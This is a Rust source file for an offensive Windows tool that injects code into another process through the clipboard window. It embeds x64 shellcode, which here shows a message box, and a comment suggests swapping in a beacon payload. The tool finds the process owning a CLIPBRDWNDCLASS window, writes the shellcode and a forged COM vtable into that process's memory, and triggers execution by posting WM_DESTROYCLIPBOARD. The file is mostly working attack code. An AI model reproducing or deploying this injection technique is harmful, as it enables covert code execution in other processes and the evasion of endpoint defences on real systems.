// https://web.archive.org/web/20221211161146/https://modexp.wordpress.com/2019/05/24/4066/
#![allow(non_snake_case, dead_code)]

use std::{mem::zeroed, os::raw::c_void, ptr::null_mut};

use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx},
        Threading::{
            OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
            PROCESS_VM_WRITE, QueryFullProcessImageNameA,
        },
    },
    UI::WindowsAndMessaging::{
        FindWindowExA, GetWindowThreadProcessId, HWND_MESSAGE, PostMessageA, SetPropA,
        WM_DESTROYCLIPBOARD,
    },
};

// const SHELLCODE: &[u8] = include_bytes!("../beacon_x64.bin");
const SHELLCODE: [u8; 329] = [
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41,
    0x50, 0x52, 0x48, 0x31, 0xd2, 0x51, 0x56, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18,
    0x48, 0x8b, 0x52, 0x20, 0x41, 0xb9, 0xeb, 0xd6, 0x04, 0xe7, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f,
    0xb7, 0x4a, 0x48, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9,
    0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c,
    0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x6f, 0x00, 0x00, 0x00, 0x8b,
    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x64, 0x48, 0x01, 0xd0, 0x50, 0x44, 0x8b,
    0x40, 0x20, 0x49, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0xe3, 0x53, 0x44, 0x8b, 0x4c, 0x24, 0x08, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d,
    0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x45, 0x39, 0xd1, 0x75, 0xdb, 0x58, 0x44, 0x8b,
    0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01,
    0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x48, 0x01, 0xd0, 0x5a, 0x41,
    0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59,
    0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0xe8, 0x0b, 0x00, 0x00, 0x00, 0x75,
    0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x59, 0x41, 0xba, 0x46, 0xf1, 0xae,
    0x95, 0xff, 0xd5, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x1b, 0x00, 0x00, 0x00, 0x43,
    0x6c, 0x69, 0x70, 0x62, 0x6f, 0x61, 0x72, 0x64, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x20,
    0x49, 0x6e, 0x6a, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x5a, 0xe8, 0x11, 0x00, 0x00, 0x00,
    0x43, 0x6c, 0x69, 0x70, 0x62, 0x6f, 0x61, 0x72, 0x64, 0x20, 0x4d, 0x73, 0x67, 0x42, 0x6f, 0x78,
    0x00, 0x41, 0x58, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x8f, 0xe1, 0xce, 0x38, 0xff, 0xd5, 0x48, 0x31,
    0xc9, 0x41, 0xba, 0x3d, 0x23, 0x0e, 0xb6, 0xff, 0xd5,
];
const SHELLCODE_SIZE: usize = SHELLCODE.len();

#[repr(C)]
struct UnknowStruct {
    lpVtbl: usize,
    QueryInterface: usize,
    AddRef: usize,
    Release: usize,
}

fn get_proc_name(pid: u32) -> String {
    unsafe {
        let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);

        if handle.is_null() {
            println!(
                "[-] OpenProcess failed: {}",
                std::io::Error::last_os_error()
            );
            return String::new();
        }

        let mut buffer = [0; 260];
        let mut size = buffer.len() as u32;
        if QueryFullProcessImageNameA(handle, 0, buffer.as_mut_ptr(), &mut size) == 0 {
            println!(
                "[-] QueryFullProcessImageNameA failed: {}",
                std::io::Error::last_os_error()
            );
            return String::new();
        }
        CloseHandle(handle);

        let proc_name = String::from_utf8_lossy(&buffer[..size as usize]).into_owned();
        proc_name
            .rsplit('\\')
            .next()
            .unwrap_or(&proc_name)
            .to_string()
    }
}

fn enum_clip() {
    unsafe {
        let mut h_window: *mut c_void = null_mut();

        loop {
            h_window = FindWindowExA(
                HWND_MESSAGE,
                h_window,
                "CLIPBRDWNDCLASS\0".as_ptr() as *const u8,
                null_mut(),
            );

            if h_window.is_null() {
                break;
            }

            let mut proc_id: u32 = 0;
            GetWindowThreadProcessId(h_window, &mut proc_id);

            let proc_name = get_proc_name(proc_id);

            println!(
                "[+] {:<15} PID: {:<6} Handle: 0x{:016X}",
                proc_name, proc_id, h_window as usize
            );
        }
    }
}

fn inject_clip() {
    unsafe {
        let mut unknown_struct = zeroed::<UnknowStruct>();
        let h_window = FindWindowExA(
            HWND_MESSAGE,
            null_mut(),
            "CLIPBRDWNDCLASS\0".as_ptr() as *const u8,
            null_mut(),
        );
        if h_window.is_null() {
            println!("[-] No clipboard window found");
            return;
        }

        let mut proc_id: u32 = 0;
        GetWindowThreadProcessId(h_window, &mut proc_id);

        println!(
            "[+] Injecting to {} PID: {}",
            get_proc_name(proc_id),
            proc_id
        );

        let proc_handle = OpenProcess(
            PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            0,
            proc_id,
        );
        if proc_handle.is_null() {
            println!(
                "[-] OpenProcess failed: {}",
                std::io::Error::last_os_error()
            );
            return;
        }

        let remote_mem = VirtualAllocEx(
            proc_handle,
            null_mut(),
            SHELLCODE_SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READ,
        );

        if remote_mem.is_null() {
            println!(
                "[-] VirtualAllocEx failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(proc_handle);
            return;
        }
        println!("[+] Allocated memory at 0x{:016X}", remote_mem as usize);

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            proc_handle,
            remote_mem,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE_SIZE,
            &mut bytes_written,
        ) == 0
        {
            println!(
                "[-] WriteProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(proc_handle);
        }
        println!(
            "[+] Written {} bytes at 0x{:016X}",
            bytes_written, remote_mem as usize
        );

        let struct_mem = VirtualAllocEx(
            proc_handle,
            null_mut(),
            size_of::<UnknowStruct>(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if struct_mem.is_null() {
            println!(
                "[-] VirtualAllocEx failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(proc_handle);
            return;
        }

        println!(
            "[+] Allocated struct memory at 0x{:016X}",
            struct_mem as usize
        );

        unknown_struct.lpVtbl = struct_mem as usize + size_of::<usize>();
        unknown_struct.Release = remote_mem as usize;

        if WriteProcessMemory(
            proc_handle,
            struct_mem,
            &unknown_struct as *const _ as *const c_void,
            size_of::<UnknowStruct>(),
            null_mut(),
        ) == 0
        {
            println!(
                "[-] WriteProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(proc_handle);
        }
        println!("[+] Written struct at 0x{:016X}", struct_mem as usize);

        SetPropA(
            h_window,
            "ClipboardDataObjectInterface\0".as_ptr() as *const u8,
            struct_mem,
        );

        println!("[+] Triggering clipboard update...");

        PostMessageA(h_window, WM_DESTROYCLIPBOARD, 0, 0);

        CloseHandle(proc_handle);
    }
}

fn main() {
    let args = std::env::args().collect::<Vec<String>>();

    if args.len() < 2 {
        println!("Usage: {} <command>", args[0]);
        println!("Commands:");
        println!("  enum_clip - Enumerate clipboards");
        println!("  inject_clip - inject to clipboard");
        return;
    }

    match args[1].as_str() {
        "enum_clip" => enum_clip(),
        "inject_clip" => inject_clip(),
        _ => {
            println!("Unknown command: {}", args[1]);
            println!("Usage: {} <command>", args[0]);
            println!("Commands:");
            println!("  enum_clip - Enumerate clipboards");
            println!("  inject_clip - inject to clipboard");
        }
    }
}
